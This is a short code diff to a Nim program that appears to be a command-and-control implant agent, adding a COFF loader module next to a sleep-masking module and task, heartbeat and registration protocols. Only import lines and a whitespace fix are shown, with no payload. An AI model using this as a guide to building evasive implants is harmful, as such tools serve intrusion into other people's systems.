@@ -1,6 +1,6 @@
 import strformat, os, times, system, base64
 
-import core/[http, context, sleepmask]
+import core/[http, context, sleepmask, coff]
 import protocol/[task, result, heartbeat, registration]
 import ../modules/manager
 import ../common/[types, utils, crypto]
@@ -69,5 +69,5 @@ proc main() =
         except CatchableError as err: 
             echo "[-] ", err.msg
           
-when isMainModule: 
+when isMainModule:
     main() 
